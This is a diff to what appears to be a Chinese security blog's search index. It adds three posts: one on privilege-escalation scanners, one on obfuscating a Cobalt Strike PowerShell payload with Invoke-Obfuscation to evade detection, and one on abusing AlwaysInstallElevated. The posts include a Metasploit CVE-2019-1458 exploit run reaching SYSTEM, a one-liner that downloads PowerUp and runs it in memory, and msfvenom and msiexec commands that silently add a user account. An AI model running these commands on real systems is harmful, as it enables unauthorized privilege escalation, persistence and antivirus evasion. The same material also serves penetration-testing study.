@@ -4,6 +4,81 @@
   
   
   <entry>
+    <title>提权扫描工具一览</title>
+    <link href="/2021/06/09/%E6%8F%90%E6%9D%83%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%B8%80%E8%A7%88/"/>
+    <url>/2021/06/09/%E6%8F%90%E6%9D%83%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%B8%80%E8%A7%88/</url>
+    
+    <content type="html"><![CDATA[<h2 id="使用Windows-Exploit-Suggester解析systeminfo"><a href="#使用Windows-Exploit-Suggester解析systeminfo" class="headerlink" title="使用Windows-Exploit-Suggester解析systeminfo"></a>使用Windows-Exploit-Suggester解析systeminfo</h2><p><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./windows-exploit-suggester.py</span><br></code></pre></td></tr></table></figure><h2 id="使用Linux-Exploit-Suggester-sh寻找linux提权问题"><a href="#使用Linux-Exploit-Suggester-sh寻找linux提权问题" class="headerlink" title="使用Linux-Exploit-Suggester.sh寻找linux提权问题"></a>使用Linux-Exploit-Suggester.sh寻找linux提权问题</h2><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./linux-exploit-suggester.sh</span><br></code></pre></td></tr></table></figure><h2 id="使用Sherlock"><a href="#使用Sherlock" class="headerlink" title="使用Sherlock"></a>使用Sherlock</h2><p><a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-variable">Sherlock</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Find</span><span class="hljs-operator">-</span><span class="hljs-variable">AllVulns</span><br></code></pre></td></tr></table></figure><h2 id="使用msf查询补丁和可利用提权漏洞"><a href="#使用msf查询补丁和可利用提权漏洞" class="headerlink" title="使用msf查询补丁和可利用提权漏洞"></a>使用msf查询补丁和可利用提权漏洞</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 查询补丁</span><br>meterpreter&gt; <span class="hljs-builtin-name">run</span> post/windows/gather/enum_patches <br>[+] KB2999226 installed on 11/25/2020<br>[+] KB976902 installed on 11/21/2010<br><br><span class="hljs-comment"># 查询Exp</span><br>msf&gt; use post/multi/recon/local_exploit_suggester <br>msf&gt; <span class="hljs-builtin-name">set</span> LHOST &lt;攻击机IP&gt;<br>msf&gt; <span class="hljs-builtin-name">set</span> SESSION &lt;session_id&gt;<br>msf&gt; run<br><br><span class="hljs-comment"># 利用示例</span><br>msf&gt; use exploit/windows/local/cve_2019_1458_wizardopium <br>msf&gt; <span class="hljs-builtin-name">set</span> SESSION &lt;session_id&gt;<br>msf&gt; run<br>meterpreter&gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br></code></pre></td></tr></table></figure><h2 id="使用powerup检查提权漏洞"><a href="#使用powerup检查提权漏洞" class="headerlink" title="使用powerup检查提权漏洞"></a>使用powerup检查提权漏洞</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">powershell.exe -exec <span class="hljs-keyword">bypass </span>-Command <span class="hljs-string">&quot;&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br>powershell.exe -<span class="hljs-keyword">nop </span>-exec <span class="hljs-keyword">bypass </span>-c <span class="hljs-string">&quot;IEX (New-object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#x27;);Invoke-AllChecks&quot;</span><br></code></pre></td></tr></table></figure><h2 id="使用accesschk-exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改"><a href="#使用accesschk-exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改" class="headerlink" title="使用accesschk.exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改"></a>使用accesschk.exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stata">accesschk <span class="hljs-string">&quot;d:\dir&quot;</span><br>查看所有用户在<span class="hljs-keyword">d</span>盘<span class="hljs-keyword">dir</span>路径的子路径的权限<br><br>accesschk <span class="hljs-string">&quot;Administrator &quot;</span><span class="hljs-keyword">d</span>:\<span class="hljs-keyword">dir</span>&quot;<br>查看Administrator用户在<span class="hljs-keyword">d</span>盘<span class="hljs-keyword">dir</span>路径的子路径的权限<br><br>accesschk Administrators -c *<br>查看Administrators组对所有服务的权限<br><br>accesschk -k Guest hklm\software<br>查看Guest用户对hklm\software注册表的权限<br><br>accesschk -<span class="hljs-keyword">ou</span> User<br>查看User用户对全局对象的权限<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>提权</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>提权</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>使用Invoke-Obfuscation对恶意powershell编码隐藏特征</title>
+    <link href="/2021/06/09/%E4%BD%BF%E7%94%A8Invoke-Obfuscation%E5%AF%B9%E6%81%B6%E6%84%8Fpowershell%E7%BC%96%E7%A0%81%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81/"/>
+    <url>/2021/06/09/%E4%BD%BF%E7%94%A8Invoke-Obfuscation%E5%AF%B9%E6%81%B6%E6%84%8Fpowershell%E7%BC%96%E7%A0%81%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81/</url>
+    
+    <content type="html"><![CDATA[<h2 id="使用cs生成powershell-payload"><a href="#使用cs生成powershell-payload" class="headerlink" title="使用cs生成powershell payload"></a>使用cs生成powershell payload</h2><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/obfuscation/ps01.png"></p><h2 id="使用Invoke-Obfuscation对其aes加密"><a href="#使用Invoke-Obfuscation对其aes加密" class="headerlink" title="使用Invoke-Obfuscation对其aes加密"></a>使用Invoke-Obfuscation对其aes加密</h2><p>下载</p><p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/obfuscation/ps02.png"></p><p>加密payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">Import-Module .\Invoke-Obfuscation.ps1<br>Invoke-Obfuscation<br>set scriptpath .\payload.ps1<br>encoding<br>选择encoding方式（数字）<br>out payload2.ps1<br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>使用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Import</span>-Module .\payload<span class="hljs-number">2</span>.ps<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/obfuscation/ps03.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>bypass</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>bypass</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>AlwaysInstallElevated提权</title>
+    <link href="/2021/06/09/AlwaysInstallElevated%E6%8F%90%E6%9D%83/"/>
+    <url>/2021/06/09/AlwaysInstallElevated%E6%8F%90%E6%9D%83/</url>
+    
+    <content type="html"><![CDATA[<h2 id="AlwaysInstallElevated提权"><a href="#AlwaysInstallElevated提权" class="headerlink" title="AlwaysInstallElevated提权"></a>AlwaysInstallElevated提权</h2><p>windows有一个系统进程MSIEXEC，用于安装Windows Installer安装包，AlwaysInstallElevated是一个组策略配置，如果启用，那么将允许普通用户以SYSTEM权限运行msi文件进行安装。如果对方机器恰好开启，我们就可以利用此缺陷提权。</p><h2 id="powerup"><a href="#powerup" class="headerlink" title="powerup"></a>powerup</h2><p>下载链接：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></p><p>powerup的利用：</p><p>检查注册表的设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -<span class="hljs-built_in">exec</span> bypass -Command <span class="hljs-string">&quot;&amp; &#123;import-module .\powerup.ps1; get-registryalwaysinstallelevated&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>生成新的账户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -<span class="hljs-built_in">exec</span> bypass -Command <span class="hljs-string">&quot;&amp; &#123;import-module .\powerup.ps1; write-useraddmsi&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/alwaysinstall/always01.png"></p><p>生成一个msi文件</p><p>使用以下命令静默安装即可生成新用户</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msiexec <span class="hljs-regexp">/q /i</span> useradd.msi<br></code></pre></td></tr></table></figure><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>msf生成</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/adduser <span class="hljs-attribute">USER</span>=test1 <span class="hljs-attribute">PASSWORD</span>=passwd1 -f msi -o up.msi<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/alwaysinstall/always02.png"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">msiexec <span class="hljs-string">/quiet</span> <span class="hljs-string">/qn</span> <span class="hljs-string">/i</span> up.msi<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>提权</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>提权</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>信息收集总结</title>
     <link href="/2021/05/31/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/"/>
     <url>/2021/05/31/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/</url>
